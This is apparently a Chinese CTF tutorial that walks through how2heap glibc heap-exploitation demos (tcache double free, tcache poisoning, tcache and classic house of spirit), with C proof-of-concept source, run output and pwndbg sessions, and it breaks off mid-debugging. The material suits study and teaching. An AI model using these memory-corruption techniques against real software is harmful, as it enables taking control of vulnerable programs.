
# how2heap之完结篇


                                阅读量   
                                **711674**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/199468/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/199468/t01e0c10f1efb991b6e.jpg)](./img/199468/t01e0c10f1efb991b6e.jpg)

> 欢迎各位喜欢安全的小伙伴们加入星盟安全 UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
终于到了glibc2.26，本节包括tcache_dup,tcache_poisoning,tcache_house_of_spirit,house_of_spirit(乱入),house_of_botcake

PS:由于本人才疏学浅,文中可能会有一些理解的不对的地方,欢迎各位斧正 🙂

## 参考网站

```
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/
https://hackmd.io/@DIuvbu1vRU2C5FwWIMzZ_w/HkyVl98b8
```



## tcache_dup

### <a class="reference-link" name="%E5%BA%8F"></a>序

glibc版本大于2.26之后，引入了tcache这一新机制，也完美展示了如何通过牺牲安全性来提升速度,当然可能也因为太不安全了,在2.29中就新增了保护机制,比如本文中的tcache double free就在2.29中被命运扼住了咽喉,国内比赛2.29的题目比较少,但是国际上很多比赛早已引入2.29的题目

在分析漏洞利用demo时，我们先来看看这个tcache机制，这里也引入一篇之前总结的[文章](https://nightrainy.github.io/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/)<br>
，还有ctfwiki的关于tcache的[总结](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)

有不想跳转的同学，我在这里也做一个解释

要注意的是新引入的tcache的优先级是高于fastbin的

PS：calloc是不会从tcache中拿chunk的

<a class="reference-link" name="%E5%85%B3%E4%BA%8Etcache"></a>**关于tcache**
1. tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk
1. 64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次
1. 这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)
<a class="reference-link" name="%E6%96%B0%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"></a>**新的结构体**

在更新版本的时候，引入了两个新的结构体:tcahce_entry和tcache_perthread_struct,两个结构体的定义如下:

```
+/* We overlay this structure on the user-data portion of a chunk when
+   the chunk is stored in the per-thread cache.  */
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+
+/* There is one of these for each thread, which contains the
+   per-thread cache (hence "tcache_perthread_struct").  Keeping
+   overall size low is mildly important.  Note that COUNTS and ENTRIES
+   are redundant (we could have just counted the linked list each
+   time), this is for performance reasons.  */
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+static __thread char tcache_shutting_down = 0;
+static __thread tcache_perthread_struct *tcache = NULL;
```

从定义中可以看到，我们的tcache_entry为单链表结构

而tcache_perthread_struct为tcahch机制的主体，一个链表中内存块的最大数量为TCACHE_MAX_BINS即64

<a class="reference-link" name="%E6%96%B0%E7%9A%84%E5%87%BD%E6%95%B0"></a>**新的函数**

于此同时，也新加了两个函数,tcache_get 和tcache_put

```
+/* Caller must ensure that we know tc_idx is valid and there's room
+   for more chunks.  */
+static void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+  assert (tc_idx &lt; TCACHE_MAX_BINS);
+  e-&gt;next = tcache-&gt;entries[tc_idx];
+  tcache-&gt;entries[tc_idx] = e;
+  ++(tcache-&gt;counts[tc_idx]);
+}
+
+/* Caller must ensure that we know tc_idx is valid and there's
+   available chunks to remove.  */
+static void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache-&gt;entries[tc_idx];
+  assert (tc_idx &lt; TCACHE_MAX_BINS);
+  assert (tcache-&gt;entries[tc_idx] &gt; 0);
+  tcache-&gt;entries[tc_idx] = e-&gt;next;
+  --(tcache-&gt;counts[tc_idx]);
+  return (void *) e;
+}
+
```

从这两个函数中也可以看到开发者希望调用的人确保参数合法，这就2333<br>
我们可以看到在tcache_get中，我们唯一需要保证的就是tcache-&gt;entries[tc_idx] = e-&gt;next，这也就意味着安全性的急剧丧失

下面我们就直接看一下源代码

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

因为十分简单，所以我们简单一些

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    //本demo是一个简单的利用tcache的double-free attack
    fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.n");

    fprintf(stderr, "Allocating buffer.n");
    int *a = malloc(8);

    fprintf(stderr, "malloc(8): %pn", a);
    fprintf(stderr, "Freeing twice...n");
    free(a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p ].n", a, a);
    fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].n", malloc(8), malloc(8));

    return 0;
}
```

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>运行结果

```
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x56028230f260
Freeing twice...
Now the free list has [ 0x56028230f260, 0x56028230f260 ].
Next allocated buffers will be same: [ 0x56028230f260, 0x56028230f260 ].
```

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"></a>代码调试

这里就直接显示free后的状态吧

```
pwndbg&gt; bins
tcachebins
0x20 [  2]: 0x555555756260 ◂— 0x555555756260 /* '`buUUU' */
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

因为没有检查，因此可以看到我们连续free两次chunk就构造了一个循环

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以

这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了

然后我们再malloc两次就可以得到同一块内存的chunk

对本程序而言，程序先malloc了一个chunk a(size=8)

然后连续Freee两次chunk a,此时在free list中就会链入两次chunk a,

这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了



## tcache_poisoning

### <a class="reference-link" name="%E5%BA%8F"></a>序

对于tcache来说，我们不需要像fastbin那样伪造一个size符合要求的地址来任意malloc，我们只需要直接覆盖fd指针就可以了

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;

int main()
{
    //此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）
    fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc inton"
           "returning a pointer to an arbitrary location (in this case, the stack).n"
           "The attack is very similar to fastbin corruption attack.nn");

    size_t stack_var;
    //我们想要返回的地址是stack_var
    fprintf(stderr, "The address we want malloc() to return is %p.n", (char *)&amp;stack_var);

    fprintf(stderr, "Allocating 1 buffer.n");
    intptr_t *a = malloc(128);
    fprintf(stderr, "malloc(128): %pn", a);
    fprintf(stderr, "Freeing the buffer...n");
    free(a);

    fprintf(stderr, "Now the tcache list has [ %p ].n", a);
    //我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址
    fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %pn"
        "to point to the location to control (%p).n", sizeof(intptr_t), a, &amp;stack_var);
    a[0] = (intptr_t)&amp;stack_var;

    fprintf(stderr, "1st malloc(128): %pn", malloc(128));
    fprintf(stderr, "Now the tcache list has [ %p ].n", &amp;stack_var);

    intptr_t *b = malloc(128);
    fprintf(stderr, "2nd malloc(128): %pn", b);
    fprintf(stderr, "We got the controln");

    return 0;
}
```

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>运行结果

```
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7ffeeef34a50.
Allocating 1 buffer.
malloc(128): 0x5560af76b260
Freeing the buffer...
Now the tcache list has [ 0x5560af76b260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x5560af76b260
to point to the location to control (0x7ffeeef34a50).
1st malloc(128): 0x5560af76b260
Now the tcache list has [ 0x7ffeeef34a50 ].
2nd malloc(128): 0x7ffeeef34a50
We got the control
```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"></a>关键代码调试

这次将断点下在了

```
15     intptr_t *a = malloc(128);
 ► 16     fprintf(stderr, "malloc(128): %pn", a);

   18     free(a);
   19 
 ► 20     fprintf(stderr, "Now the tcache list has [ %p ].n", a);

 ► 23     a[0] = (intptr_t)&amp;stack_var;

   28     intptr_t *b = malloc(128);
 ► 29     fprintf(stderr, "2nd malloc(128): %pn", b);
```

我们直接运行就好，首先我们申请了chunk a,此时的堆是这样的

```
pwndbg&gt; heap
0x555555756000 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 593, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555756250 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 145, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557562e0 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 134433, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

此时可能有同学会比较疑惑，我们明明只malloc了一个size为128的chunk为什么最前面有一个大小为0x251的chunk嘞,这个其实就是tcache_perthread_struct这个用来管理tcache的结构体

好了，解决了这个问题我们就继续下一步吧，让我们free掉a

```
pwndbg&gt; bins
tcachebins
0x90 [  1]: 0x555555756260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

可以看到此时我们的chunk a已经被放到了tcache中

此时我们所需要做的就极其简单了，因为tcache没有检查size是否符合规格这一设定，因此我们直接覆写chunk a 的fd指针，让他链在我们的free list中

```
pwndbg&gt; bins
tcachebins
0x90 [  1]: 0x555555756260 —▸ 0x7fffffffe5c0 ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg&gt; x/10gx 0x555555756250
0x555555756250:    0x0000000000000000    0x0000000000000091
0x555555756260:    0x00007fffffffe5c0    0x0000000000000000
0x555555756270:    0x0000000000000000    0x0000000000000000
0x555555756280:    0x0000000000000000    0x0000000000000000
0x555555756290:    0x0000000000000000    0x0000000000000000
```

此时我们只需要malloc一次就可以取出来了（开篇时有提及，tcache是先进后出的

```
pwndbg&gt; p/x b-2
$1 = 0x7fffffffe5b0

$2 = {
  mchunk_prev_size = 0x7fffffffe5e0, 
  mchunk_size = 0x555555554942, 
  fd = 0x5555555549a0, 
  bk = 0x555555756260, 
  fd_nextsize = 0x7fffffffe5c0, 
  bk_nextsize = 0xa9ab61495b094700
}
pwndbg&gt; p/x stack_var
$3 = 0x5555555549a0
pwndbg&gt;
```

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

对于tcache poisoning来说，我们的利用极其简单

只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了

程序首先在栈上声明了一个变量，之后malloc了chunk a(size=128),此时free掉chunk a,a被链入到free list中

然后程序覆写了a的fd指针，将其指向了我们的栈指针

现在栈指针也被链入了我们的free list中

此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出)



## tcache_house_of_spirit

### <a class="reference-link" name="%E5%BA%8F"></a>序

我们的tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    //本文件是通过tcache来利用house of sprirt技术的demo
    fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.n");

    //这个技术与原始的HOS利用方式相似，但我们不需要在fake chunk被free之后创建fake chunk
    fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.n");

    //我们可以看到在malloc.c中的_int_free调用tcach_put时并没有检查下一个chunk的szie和prev_inuse位是合理的
    fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.n");

    //搜索字符串"invalid next size"和"double free or corruption"
    fprintf(stderr, "(Search for strings "invalid next size" and "double free or corruption")nn");

    //好了，现在我们开始
    fprintf(stderr, "Ok. Let's start with the example!.nn");

    //先调用一次malloc来设置内存
    fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
    malloc(1);

    //想象一下，现在我们覆写一个指针来指向我们的fake chunk区域
    fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.n");
    unsigned long long *a; //pointer that will be overwritten
    unsigned long long fake_chunks[10]; //fake chunk region

    //该区域包括一个fake chunk
    fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %pn", &amp;fake_chunks[1]);

    //此chunk的size必须在是符合tcache大小的即chunk的size要小于0x410，这也就意味着我们malloc的size要小于0x408(在x64位上。而我们的PREV_INUSE(lsb)位在tcache chunks中是被忽略了的，但是另外两个标志位会引发一些问题，他们是IS_MAPPED和NON_MAIN_ARENA
    fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n");

    //要注意的是这个也必须是下一次malloc请求的size，会是一个区间，举一个例子，在x64上，0x30-0x38都将被防到0x40中，因此他们最后使用malloc的参数
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n");
    fake_chunks[1] = 0x40; // this is the size

    //现在我们将用有着第一个fake chunk地址的fake chunk与来覆写我们的指针
    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n", &amp;fake_chunks[1]);

    //要注意的是我们chunk的内存地址将会以16字节对齐
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n");

    a = &amp;fake_chunks[2];

    //此时释放被覆写的指针
    fprintf(stderr, "Freeing the overwritten pointer.n");
    free(a);

    //现在我们再malloc就会返回我们的fake chunk了
    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &amp;fake_chunks[1], &amp;fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %pn", malloc(0x30));
}
```

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>程序运行结果

```
This file demonstrates the house of spirit attack on tcache.
It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.
You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.
(Search for strings "invalid next size" and "double free or corruption")

Ok. Let's start with the example!.

Calling malloc() once so that it sets up its memory.
Let's imagine we will overwrite 1 pointer to point to a fake chunk region.
This region contains one fake chunk. It's size field is placed at 0x7ffcb22034d8
This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcb22034d8.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffcb22034d8, which will be 0x7ffcb22034e0!
malloc(0x30): 0x7ffcb22034e0

```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"></a>关键代码调试

本例的断点如下：

```
15     malloc(1);
   16 
 ► 17     fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.n");

   18     unsigned long long *a; //pointer that will be overwritten
   19     unsigned long long fake_chunks[10]; //fake chunk region
   20 
 ► 21     fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %pn", &amp;fake_chunks[1]);

 ► 25     fake_chunks[1] = 0x40; // this is the size

   31     a = &amp;fake_chunks[2];
   32 
 ► 33     fprintf(stderr, "Freeing the overwritten pointer.n");

   34     free(a);
   35 
 ► 36     fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &amp;fake_chunks[1], &amp;fake_chunks[2]);

   37     fprintf(stderr, "malloc(0x30): %pn", malloc(0x30));
 ► 38 }
```

下面我们进入调试

首先是我们malloc(1)的结果

```
pwndbg&gt; heap
0x555555757000 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 593, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757250 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20d91
}
0x555555757270 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 134545, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

如果不知道为什么size是33，可以复习一下glibc源码实现，这里即使malloc(0)也是可以得到同样效果的

然后我们让程序继续跑起来

现在我们有了两个野指针，分别在

```
pwndbg&gt; p/x &amp;a
$1 = 0x7fffffffe568
pwndbg&gt; p/x &amp;fake_chunks
$2 = 0x7fffffffe570
pwndbg&gt; p/x fake_chunks
$3 = {0x9, 0x7ffff7dd7660, 0x7fffffffe5e8, 0xf0b5ff, 0x1, 0x555555554a6d, 0x7ffff7de59a0, 0x0, 0x555555554a20, 0x5555555546c0}
pwndbg&gt; p/x a
$4 = 0x756e6547
```

现在我们给我们的fake chunk的size赋值为0x40，此时的fake_chunks

```
pwndbg&gt; p/x fake_chunks
$10 = {0x9, 0x40, 0x7fffffffe5e8, 0xf0b5ff, 0x1, 0x555555554a6d, 0x7ffff7de59a0, 0x0, 0x555555554a20, 0x5555555546c0}
```

然后把我们的fake_chunks[2]的值赋给我们的a，也就是将a指向我们的fd指针

```
pwndbg&gt; x/2gx a
0x7fffffffe580:    0x00007fffffffe5e8    0x0000000000f0b5ff
pwndbg&gt; x/10gx a-2 
0x7fffffffe570:    0x0000000000000009    0x0000000000000040
0x7fffffffe580:    0x00007fffffffe5e8    0x0000000000f0b5ff
0x7fffffffe590:    0x0000000000000001    0x0000555555554a6d
0x7fffffffe5a0:    0x00007ffff7de59a0    0x0000000000000000
0x7fffffffe5b0:    0x0000555555554a20    0x00005555555546c0
```

现在free a,此时我们就把我们的a放入了free list中

```
pwndbg&gt; bins
tcachebins
0x40 [  1]: 0x7fffffffe580 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

此时就可以将我们的地址malloc回来了

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

本例就是通过free一个fake chunk来让我们malloc任意地址

程序首先让堆初始化了，然后申请了变量a和fake_chunks

之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针

现在free a，我们的fake_chunk就被放到了free list中

此时再malloc就可以返回我们的fake chunk了



## house of spirit

### <a class="reference-link" name="%E5%BA%8F"></a>序

在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的

我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc

让我们来看看和tcache有什么区别吧

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack.n");
  //调用一次malloc来初始化堆  
    fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
    malloc(1);

  //现在我们将覆写一个指针来指向一个伪造的fastbin域
    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.n");
    unsigned long long *a;
  //这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

  //这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始
    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);

  //这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题
    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n");
    fake_chunks[1] = 0x40; // this is the size

  //下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小
    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

  //现在我们将通过有着fake first chunks的fake区域地址来覆写我们的指针
    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n", &amp;fake_chunks[1]);
  //要注意的是,chunk必须是16字节对齐的
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n");
    a = &amp;fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.n");
    free(a);
  //现在下一次的malloc就将会返回我们的fake chunk了
    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &amp;fake_chunks[1], &amp;fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %pn", malloc(0x30));
}
```

看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的

### <a class="reference-link" name="%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>运行结果

```
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.
This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!
malloc(0x30): 0x7ffe23a56260
```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E8%B0%83%E8%AF%95"></a>关键调试

本例断点下在了

```
► 11     fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.n");
   12     unsigned long long *a;

   20     fake_chunks[1] = 0x40; // this is the size
 ► 22     fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n");

   24     fake_chunks[9] = 0x1234; // nextsize
   25 
 ► 26     fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n", &amp;fake_chunks[1]);

 ► 28     a = &amp;fake_chunks[2];

 ► 31     free(a);
```

好嘞,我们现在进入调试

首先是初始话堆的过程

```
pwndbg&gt; heap
0x555555757000 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 593, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757250 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20d91
}
0x555555757270 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 134545, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

然后我们打印一下我们的fake_chunks

```
pwndbg&gt; p/x fake_chunks
$2 = {0x9, 0x7ffff7dd7660, 0x7fffffffe5f8, 0xf0b5ff, 0x1, 0x555555554a2d, 0x7ffff7de59a0, 0x0, 0x5555555549e0, 0x5555555546c0}
pwndbg&gt; p/x &amp;fake_chunks
$3 = 0x7fffffffe580
```

之后我们来伪造我们的fake_chunk,我们将第一个fake chunk的size设为0x40

```
pwndbg&gt; p/x fake_chunks
$4 = {0x9, 0x40, 0x7fffffffe5f8, 0xf0b5ff, 0x1, 0x555555554a2d, 0x7ffff7de59a0, 0x0, 0x5555555549e0, 0x5555555546c0}
pwndbg&gt; x/10gx fake_chunks
0x7fffffffe580:    0x0000000000000009    0x0000000000000040
0x7fffffffe590:    0x00007fffffffe5f8    0x0000000000f0b5ff
0x7fffffffe5a0:    0x0000000000000001    0x0000555555554a2d
0x7fffffffe5b0:    0x00007ffff7de59a0    0x0000000000000000
0x7fffffffe5c0:    0x00005555555549e0    0x00005555555546c0
$5 = {
  mchunk_prev_size = 9, 
  mchunk_size = 64, 
  fd = 0x7fffffffe5f8, 
  bk = 0xf0b5ff, 
  fd_nextsize = 0x1, 
  bk_nextsize = 0x555555554a2d &lt;__libc_csu_init+77&gt;
}
```

此时如果是tcache_hos的话已经可以了,但我们fastbin的话就需要使下一个chunk合法,也就是要给我们的fake_chunks[9]赋值了

为什么是fake_chunks[9]呢?因为在程序中,我们需要连续伪造两块chunk,而本例中第一块chunk的size将设为0x40了,因此fake_chunk[1]是第一个伪造的chunk的size的话,我们第二个伪造的chunk就要往下0x40也就是fake_chunk[1]+8的地方,即fake_chunk[9](%E8%BF%99%E9%87%8C%E8%AF%B4%E6%98%8E%E6%97%B6%E6%88%91%E5%B0%B1%E4%BB%A5size%E4%B8%BA%E5%9F%BA%E5%87%86%E4%BA%86%EF%BC%8C%E5%87%86%E7%A1%AE%E4%B8%80%E7%82%B9%E7%9A%84%E8%AF%B4%E6%B3%95%E6%98%AFfake_chunks%E5%92%8Cfake_chunks%5B8%5D%E5%A4%84%E8%BF%9E%E7%BB%AD%E4%BC%AA%E9%80%A0%E4%B8%A4%E4%B8%AAchunk)

赋值的大小就无所谓惹,只要比16大128kb小就好(64位机上)

```
pwndbg&gt; p/x fake_chunks
$6 = {0x9, 0x40, 0x7fffffffe5f8, 0xf0b5ff, 0x1, 0x555555554a2d, 0x7ffff7de59a0, 0x0, 0x5555555549e0, 0x1234}
pwndbg&gt; x/10gx fake_chunks
0x7fffffffe580:    0x0000000000000009    0x0000000000000040
0x7fffffffe590:    0x00007fffffffe5f8    0x0000000000f0b5ff
0x7fffffffe5a0:    0x0000000000000001    0x0000555555554a2d
0x7fffffffe5b0:    0x00007ffff7de59a0    0x0000000000000000
0x7fffffffe5c0:    0x00005555555549e0    0x0000000000001234
pwndbg&gt; p *(struct malloc_chunk*) 0x7fffffffe5c0
$7 = {
